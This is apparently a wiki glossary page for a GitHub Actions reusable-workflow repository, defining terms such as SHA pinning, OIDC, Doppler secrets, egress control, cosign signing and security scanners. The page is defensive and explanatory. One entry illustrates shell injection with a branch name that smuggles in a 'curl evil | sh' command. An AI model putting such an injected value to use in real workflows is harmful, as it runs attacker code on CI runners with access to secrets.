# Concepts and Glossary

Plain-language definitions of the ideas this repository leans on, in the order
you tend to need them. Each entry says what the thing is and why it matters
*here*.

## GitHub Actions basics

### Workflow, job, step
A **workflow** is a YAML file under `.github/workflows/`. It contains **jobs**
(run on separate machines, in parallel unless they `needs:` each other), and each
job is a list of **steps** (shell commands or `uses:` actions).

### Reusable workflow
A workflow with `on: workflow_call` that other workflows can run as if it were a
single job. The file defines **inputs** (settings) and optionally **secrets**
and **outputs**. This is the core mechanism: the pipeline is written once here
and *called* from each project. See [Calling the Workflows](Calling-the-Workflows).

### Caller
The small workflow in a project that says `uses: ChiefGyk3D/git-your-ship-together/.github/workflows/<name>.yml@<sha>` and passes `with:` inputs.

### Composite action
A reusable bundle of steps (`action.yml`). This repository has one:
`.github/actions/doppler-secrets`. A reusable *workflow* cannot reference the
commit it was loaded from, so the workflows carry an **inlined copy** of the
composite action's script and a test keeps the copies identical. See
[Design Rules and Why](Design-Rules-and-Why#the-workflows-never-reference-this-repository-by-branch).

### `GITHUB_TOKEN` and permissions
Every job gets a short-lived token. Its power is set by the `permissions:` block.
The rule here: start every file at `contents: read` and widen **per job**, only
as far as that job needs, with every write recorded in a list with a reason.

### `pull_request` vs `pull_request_target`
`pull_request` runs the PR's own workflow files with a read-only token and no
secrets for forks, which is safe. `pull_request_target` runs the *base* branch's
files **with** secrets, which is dangerous if the job then checks out and runs
the PR's code. Only a caller of `project-sync.yml` uses it, and that job never checks out
anything. See [Automation workflows](Automation-Workflows#project-sync).

## Pinning and updates

### SHA pinning
Referencing an action by the full 40-character commit (`@e14015d5...`) instead of
a tag (`@v2`). A tag can be moved to different code after you reviewed it; a
commit cannot. The human-readable version goes in a trailing comment
(`# v2.21.1`) so people and tools can read it.

### Annotated tag vs commit SHA
`git ls-remote --tags` lists an annotated tag twice. The line ending `^{}` is the
**commit**; the other is the **tag object**. Pin the commit. GitHub happens to
resolve tag objects in `uses:`, but Dependabot does not. See
[Lessons Learned](Lessons-Learned).

### Dependabot and cooldown
Dependabot opens PRs that bump pinned versions. A **cooldown** (seven days here)
means a release cut this morning is not proposed this afternoon; malicious
releases are usually pulled within days.

### zizmor and actionlint
Linters for workflow files. **actionlint** catches syntax and expression mistakes.
**zizmor** catches *security* mistakes, including a SHA pin whose version comment
no longer matches.

## Identity and secrets

### Secret
A credential (API token, password, key). Anything that, if leaked, lets someone
act as you.

### OIDC (OpenID Connect)
GitHub can mint a signed token (a JWT) for a running job that says *"I am job X of
repository Y on ref Z"*. A service that trusts GitHub can check that signature and
hand back short-lived access, so **no long-lived password is stored anywhere**.
Doppler, Codecov, cosign, PyPI and GitHub's attestation API all accept it here.
It needs `id-token: write` on the job, which is why that permission is tightly
controlled. See [Secrets and Doppler](Secrets-and-Doppler).

### Doppler
A secrets manager. Here it is the **only** store for CI credentials: listable,
scoped, auditable and rotatable in one place, unlike GitHub's write-only
encrypted secrets.

### Service Account and Identity (Doppler)
A Service Account is a non-human Doppler principal; an **Identity** on it says
which OIDC tokens it accepts (issuer, audience, subject). One per repository, so
Doppler's log says which repository fetched.

### Trusted ref
A push to the default branch, a tag, or a schedule. Secrets are fetched **only**
on these. A pull request, and a push to any other branch, gets nothing. See
`doppler-trusted-refs-only`.

### Immutable OIDC subject
The `sub` claim in the OIDC token comes in two forms: the plain
`repo:OWNER/REPO:ref:...` and the newer immutable
`repo:OWNER@<owner-id>/REPO@<repo-id>:ref:...` (default in repositories created
from mid-2026). A Doppler identity must list **both**.

## Hardening

### harden-runner
A StepSecurity action that is the first step of every job. In **audit** mode it
logs every outbound connection; in **block** mode it refuses any host not on the
allow-list. See [Egress Control](Egress-Control).

### Egress
Outbound network traffic from the runner. Controlling it limits where a
compromised step can send data.

### `persist-credentials: false`
Stops `actions/checkout` leaving the token in the repository's git config where
later steps (or a compromised dependency) could read it. Every checkout sets it,
except the wiki checkout whose push needs it.

### Environment variables, not template expansion
`${{ ... }}` inside a `run:` script is pasted into the shell *before* it runs, so
a branch name like `a"; curl evil | sh; "` becomes code. Passing values through
`env:` makes them data. Every command a caller supplies reaches the shell this
way.

## Supply chain of what you ship

### Cosign (Sigstore) and keyless signing
A signature on an image or file. **Keyless** means no private key to store: the
signing certificate is issued for the job's OIDC identity and recorded in a
public log (Rekor). Verifying checks *which workflow* signed it.

### SBOM
Software Bill of Materials: a list of every package inside an image. Generated by
**syft** (SPDX format) and attached as a cosign **attestation**, so it is bound to
the same identity as the signature.

### SLSA build provenance
A signed record of *which workflow, at which commit, built this artifact*. Stored
through GitHub's artifact attestation API. SLSA ("salsa") is the framework name.

### Attestation
A signed statement about an artifact (its SBOM, its provenance), as opposed to a
signature on the artifact itself.

### Trusted Publishing (PyPI)
PyPI accepts the job's OIDC identity for a named repository, workflow and
environment, so **no API token exists** to leak.

### Trivy
A vulnerability and misconfiguration scanner. Scans images (release) and
OpenTofu config (tofu-ci).

## Security scanning

| Tool | Finds |
|---|---|
| **CodeQL** | Code flaws, including in the workflow files themselves (the `actions` language) |
| **gitleaks** | Secrets committed anywhere in git history |
| **pip-audit** (or `npm audit`, `govulncheck`, `cargo audit`) | Known-vulnerable dependencies |
| **dependency-review** | New vulnerable or badly licensed dependencies a PR adds |
| **Semgrep** | Pattern-based code and config issues |
| **DAST / ZAP** | Dynamic testing: probing a *running* service, here with OWASP ZAP's baseline scan (see `dast.yml`) |
| **Snyk** | Open Source and Code scanning (optional, token required) |
| **OpenSSF Scorecard** | An outside score of the repository's practices |
| **Atheris** | Fuzzing Python code (see `python-fuzz.yml`) |

## This repository's own vocabulary

### `CI green`
The final job of every CI workflow. It `needs:` every other job and fails if any
failed. Branch protection requires only this one job, so adding a job later never
leaves it unrequired.

### Gate
A job whose only purpose is to say yes or no for a whole workflow. `CI green` and
`Verified` are gates.

### Baseline
The minimum settings every adopted repository must meet. See
[Repository Baseline](Repository-Baseline).

### Audit: PASS, FAIL, UNKNOWN
The weekly check of the baseline. **UNKNOWN** means the token could not ask the
question; it is never counted as a pass.

### Risk register
A file of every security advisory a pipeline is told to ignore, each with a
reason, mitigation, owner and an expiry at most 90 days out. An exception that is
not registered fails the audit.

### Fixture
`fixture/`: the smallest project that exercises every job, so a change to a
workflow runs against something real here before any caller pins it.

### Dogfooding
This repository calls its own reusable workflows on the fixture, at the pull
request's own ref. See [Testing and the Contract](Testing-and-the-Contract).

### Caller pin
The `@<sha> # vX.Y.Z` on a caller's `uses:` line. It is what actually runs.

### Measured allow-list
An egress allow-list built from hosts jobs were *observed* contacting in
audit-mode runs, rather than guessed.
